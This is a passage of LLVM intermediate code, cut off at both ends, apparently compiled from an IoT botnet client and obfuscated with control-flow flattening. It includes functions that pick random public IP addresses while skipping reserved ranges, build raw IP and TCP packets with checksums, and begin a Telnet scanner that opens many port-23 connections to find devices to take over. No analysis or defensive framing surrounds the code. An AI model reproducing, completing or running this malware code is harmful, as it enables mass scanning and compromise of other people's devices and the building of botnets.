  %165 = icmp eq i32 %164, 19
  %166 = select i1 %165, i32 2033011027, i32 1572375779
  store i32 %166, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  %168 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 198
  %171 = select i1 %170, i32 933421531, i32 -2087691098
  store i32 %171, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %174 = zext i8 %173 to i32
  %175 = icmp eq i32 %174, 51
  %176 = select i1 %175, i32 2120627061, i32 -2087691098
  store i32 %176, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %179 = zext i8 %178 to i32
  %180 = icmp eq i32 %179, 100
  %181 = select i1 %180, i32 2033011027, i32 -2087691098
  store i32 %181, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %184 = zext i8 %183 to i32
  %185 = icmp eq i32 %184, 203
  %186 = select i1 %185, i32 -944580405, i32 1041086956
  store i32 %186, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  %188 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 0
  %191 = select i1 %190, i32 -766816527, i32 1041086956
  store i32 %191, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %194 = zext i8 %193 to i32
  %195 = icmp eq i32 %194, 113
  %196 = select i1 %195, i32 2033011027, i32 1041086956
  store i32 %196, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %199 = zext i8 %198 to i32
  %200 = icmp sge i32 %199, 224
  store i32 2033011027, i32* %switchVar
  store i1 %200, i1* %.reg2mem2
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %202 = select i1 %.reload3, i32 1838103202, i32 1342072918
  store i32 %202, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = call i32 @rand() #2
  %205 = srem i32 %204, 255
  %206 = trunc i32 %205 to i8
  store i8 %206, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %207 = call i32 @rand() #2
  %208 = srem i32 %207, 255
  %209 = trunc i32 %208 to i8
  store i8 %209, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %210 = call i32 @rand() #2
  %211 = srem i32 %210, 255
  %212 = trunc i32 %211 to i8
  store i8 %212, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %213 = call i32 @rand() #2
  %214 = srem i32 %213, 255
  %215 = trunc i32 %214 to i8
  store i8 %215, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  store i32 1337032656, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %218 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %219 = zext i8 %218 to i32
  %220 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %221 = zext i8 %220 to i32
  %222 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %223 = zext i8 %222 to i32
  %224 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %225 = zext i8 %224 to i32
  %226 = call i32 (i8*, i8*, ...) @szprintf(i8* %217, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i32 0, i32 0), i32 %219, i32 %221, i32 %223, i32 %225)
  %227 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %228 = call i32 @inet_addr(i8* %227) #2
  store i32 %228, i32* %1, align 4
  store i32 145778385, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = load i32, i32* %1, align 4
  ret i32 %230

loopEnd:                                          ; preds = %216, %203, %201, %197, %192, %187, %182, %177, %172, %167, %162, %157, %152, %147, %142, %137, %132, %127, %122, %117, %112, %107, %102, %97, %92, %87, %82, %77, %72, %67, %62, %57, %44, %23, %18, %13, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 -327072350, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -327072350, label %6
    i32 731364161, label %10
    i32 305518224, label %19
    i32 815205835, label %23
    i32 -585487790, label %30
    i32 166381894, label %31
    i32 -658501953, label %36
    i32 -1591718971, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 731364161, i32 305518224
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 -327072350, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 815205835, i32 -585487790
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 -585487790, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 166381894, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 -658501953, i32 -1591718971
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 166381894, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -397549918, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -397549918, label %first
    i32 -11582181, label %7
    i32 -697841279, label %8
    i32 1507624575, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 -11582181, i32 -697841279
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 1507624575, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 1507624575, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @TelnetScan() #0 {
  %.reg2mem359 = alloca i32
  %.reg2mem18 = alloca %struct.telstate_t*
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -885162931, i32* %switchVar
  %.reg2mem370 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar17 = load i32, i32* %switchVar
  switch i32 %switchVar17, label %switchDefault [
    i32 -885162931, label %first
    i32 1265442076, label %20
    i32 -1195220055, label %21
    i32 -2090628788, label %23
    i32 465392528, label %37
    i32 -1398567341, label %42
    i32 -960965328, label %57
    i32 1841611954, label %60
    i32 1574327608, label %63
    i32 -1044049371, label %64
    i32 1777063465, label %65
    i32 -1379458346, label %70
    i32 1270979190, label %NodeBlock15
    i32 -42999531, label %NodeBlock13
    i32 -1063755414, label %NodeBlock11
    i32 -1403476713, label %NodeBlock9
    i32 -320931249, label %LeafBlock7
    i32 581144724, label %NodeBlock5
    i32 4766470, label %NodeBlock3
    i32 2012490646, label %NodeBlock1
    i32 2102199951, label %NodeBlock
    i32 -1720255432, label %LeafBlock
    i32 -707832940, label %87
    i32 -1030004273, label %100
    i32 -1079635734, label %120
    i32 338859450, label %135
    i32 -1309189160, label %146
    i32 753257416, label %155
    i32 -184941218, label %160
    i32 -1784242540, label %161
    i32 1504272223, label %186
    i32 -46862956, label %187
    i32 1603939757, label %210
    i32 -1901595993, label %215
    i32 -1801173004, label %226
    i32 1070615940, label %235
    i32 1114189718, label %236
    i32 423695040, label %244
    i32 1909701570, label %250
    i32 -224152797, label %251
    i32 175333005, label %260
    i32 -1046455695, label %261
    i32 -631768460, label %293
    i32 -2100809328, label %304
    i32 752385849, label %319
    i32 -1760267413, label %350
    i32 805067737, label %351
    i32 -1921367268, label %355
    i32 766928625, label %370
    i32 1958952140, label %371
    i32 -1864776867, label %381
    i32 581439, label %396
    i32 -1612605190, label %397
    i32 -1949599317, label %405
    i32 1641732337, label %411
    i32 814894637, label %431
    i32 1340598950, label %448
    i32 1312407203, label %453
    i32 669339491, label %458
    i32 -2079615768, label %464
    i32 -1938980461, label %484
    i32 -1812544835, label %501
    i32 -1882601075, label %506
    i32 1846351137, label %511
    i32 -633487754, label %521
    i32 185115641, label %541
    i32 -716104463, label %559
    i32 1647211941, label %579
    i32 1019447708, label %596
    i32 -1339243247, label %601
    i32 -254291744, label %606
    i32 -782644069, label %616
    i32 -646997079, label %636
    i32 928382677, label %654
    i32 427114052, label %666
    i32 -811942394, label %667
    i32 1005793893, label %668
    i32 -673278805, label %669
    i32 -646525292, label %670
    i32 -2032599245, label %680
    i32 1662775773, label %695
    i32 -128709614, label %696
    i32 1770588350, label %722
    i32 -853170575, label %737
    i32 2012069680, label %746
    i32 -1076985394, label %761
    i32 2006422667, label %766
    i32 1790058661, label %774
    i32 1485436538, label %780
    i32 1185476511, label %800
    i32 -859735365, label %817
    i32 -1202910762, label %822
    i32 854492463, label %827
    i32 1463146589, label %833
    i32 243381397, label %853
    i32 -1205934405, label %870
    i32 1299943281, label %875
    i32 -1489624330, label %880
    i32 -1727578017, label %886
    i32 919551727, label %895
    i32 1277119348, label %910
    i32 531723315, label %919
    i32 -493840064, label %934
    i32 1838133364, label %943
    i32 -1447478237, label %958
    i32 -1288950392, label %967
    i32 -1975008968, label %982
    i32 -1608969130, label %991
    i32 -1809941696, label %1006
    i32 -86920576, label %1015
    i32 -547086818, label %1030
    i32 -574921288, label %1039
    i32 -211333897, label %1054
    i32 -1747522435, label %1063
    i32 880710635, label %1078
    i32 790788414, label %1079
    i32 53140470, label %1080
    i32 1657236078, label %1081
    i32 -289241668, label %1082
    i32 -107742555, label %1083
    i32 -1507373892, label %1084
    i32 773139881, label %1085
    i32 1567044329, label %1097
    i32 297314666, label %1098
    i32 -719009651, label %1108
    i32 579272820, label %1123
    i32 1134781857, label %1124
    i32 871230973, label %1150
    i32 -1492187283, label %1165
    i32 -412585016, label %1174
    i32 1412000025, label %1189
    i32 2001117310, label %1194
    i32 -1033836807, label %1202
    i32 -1371548088, label %1208
    i32 -34693171, label %1228
    i32 545217725, label %1245
    i32 -1790163185, label %1265
    i32 -508676392, label %1274
    i32 -1025593086, label %1294
    i32 -973648741, label %1299
    i32 144683692, label %1305
    i32 -126441515, label %1325
    i32 -581980833, label %1342
    i32 -1926930930, label %1362
    i32 -1637696474, label %1371
    i32 -470197491, label %1391
    i32 311726222, label %1396
    i32 -824814330, label %1402
    i32 2118473482, label %1422
    i32 418973031, label %1439
    i32 1136667762, label %1459
    i32 -1530896896, label %1468
    i32 266275480, label %1488
    i32 -1615557552, label %1493
    i32 1170152450, label %1499
    i32 1565434108, label %1519
    i32 -1069353083, label %1536
    i32 72011725, label %1556
    i32 221175208, label %1565
    i32 -2082954192, label %1585
    i32 -1747717144, label %1590
    i32 -1350563318, label %1596
    i32 1212525796, label %1616
    i32 184559960, label %1633
    i32 -564684710, label %1653
    i32 -1992523784, label %1662
    i32 -992838374, label %1682
    i32 -352760673, label %1687
    i32 1699604363, label %1693
    i32 -1363209378, label %1713
    i32 462138088, label %1730
    i32 1786763362, label %1750
    i32 -849897242, label %1759
    i32 1071248810, label %1779
    i32 -192892366, label %1784
    i32 -1532877147, label %1790
    i32 -599103773, label %1810
    i32 2057169142, label %1827
    i32 1116619129, label %1847
    i32 831970795, label %1856
    i32 -1253707483, label %1876
    i32 40935118, label %1881
    i32 1273458029, label %1887
    i32 1218840619, label %1907
    i32 14293757, label %1924
    i32 1641373309, label %1944
    i32 1261119736, label %1953
    i32 131866190, label %1973
    i32 1595431721, label %1978
    i32 -1991178135, label %1984
    i32 317534117, label %1996
    i32 -902642668, label %1997
    i32 -1387799748, label %1998
    i32 -409039389, label %1999
    i32 -63324342, label %2000
    i32 1596393296, label %2001
    i32 -1237080364, label %2002
    i32 -284176669, label %2003
    i32 -241125394, label %2013
    i32 -446270642, label %2028
    i32 -496303514, label %2029
    i32 -635490566, label %2038
    i32 -2052439293, label %2053
    i32 -1950704811, label %2058
    i32 1905011757, label %2066
    i32 1488681542, label %2072
    i32 -2080614403, label %2081
    i32 1421581411, label %2101
    i32 -992845916, label %2111
    i32 1286720982, label %2126
    i32 -964642659, label %NewDefault
    i32 2003215975, label %2127
    i32 -2109142397, label %2128
    i32 -557398564, label %2131
    i32 -1143387516, label %2132
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp sgt i32 %.reload, 512
  %19 = select i1 %18, i32 1265442076, i32 -1195220055
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  store i32 -2090628788, i32* %switchVar
  store i32 512, i32* %.reg2mem370
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i32, i32* %1, align 4
  store i32 -2090628788, i32* %switchVar
  store i32 %22, i32* %.reg2mem370
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %.reload371 = load i32, i32* %.reg2mem370
  store i32 %.reload371, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 23) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  store %struct.telstate_t* %32, %struct.telstate_t** %.reg2mem18
  %.reload358 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %33 = bitcast %struct.telstate_t* %.reload358 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  store i32 465392528, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  %41 = select i1 %40, i32 -1398567341, i32 1841611954
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %2, align 4
  %44 = sext i32 %43 to i64
  %.reload357 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload357, i64 %44
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i32 0, i32 3
  store i8 1, i8* %46, align 1
  %47 = call noalias i8* @malloc(i64 1024) #2
  %48 = load i32, i32* %2, align 4
  %49 = sext i32 %48 to i64
  %.reload356 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload356, i64 %49
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i32 0, i32 8
  store i8* %47, i8** %51, align 8
  %52 = load i32, i32* %2, align 4
  %53 = sext i32 %52 to i64
  %.reload355 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload355, i64 %53
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %54, i32 0, i32 8
  %56 = load i8*, i8** %55, align 8
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 1024, i32 1, i1 false)
  store i32 -960965328, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %2, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %2, align 4
  store i32 465392528, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 8, i64* %61, align 8
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %62, align 8
  store i32 1574327608, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  store i32 -1044049371, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 1777063465, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %2, align 4
  %67 = load i32, i32* %1, align 4
  %68 = icmp slt i32 %66, %67
  %69 = select i1 %68, i32 -1379458346, i32 -557398564
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* %2, align 4
  %72 = sext i32 %71 to i64
  %.reload354 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload354, i64 %72
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %73, i32 0, i32 2
  %75 = load i8, i8* %74, align 8
  %76 = zext i8 %75 to i32
  store i32 %76, i32* %.reg2mem359
  store i32 1270979190, i32* %switchVar
  br label %loopEnd

NodeBlock15:                                      ; preds = %loopEntry
  %.reload369 = load volatile i32, i32* %.reg2mem359
  %Pivot16 = icmp slt i32 %.reload369, 4
  %77 = select i1 %Pivot16, i32 4766470, i32 -42999531
  store i32 %77, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload364 = load volatile i32, i32* %.reg2mem359
  %Pivot14 = icmp slt i32 %.reload364, 6
  %78 = select i1 %Pivot14, i32 581144724, i32 -1063755414
  store i32 %78, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
